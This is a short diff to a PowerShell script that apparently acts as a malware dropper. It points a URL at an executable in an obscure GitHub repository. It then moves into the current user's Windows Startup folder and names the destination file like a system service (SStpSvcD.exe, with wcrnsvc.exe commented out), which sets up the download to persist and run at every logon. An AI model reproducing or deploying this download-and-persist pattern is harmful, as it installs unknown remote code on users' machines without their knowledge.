@@ -1,4 +1,4 @@
-$url = "https://raw.githubusercontent.com/xzj4/3/refs/heads/main/SStpSvcD.exe"
+$url = "https://raw.githubusercontent.com/xzj4/3/refs/heads/main/SStpSvc.exe"
 #$destPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\wcrnsvc.exe"
 cd "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
 $destPath = ".\SStpSvcD.exe"
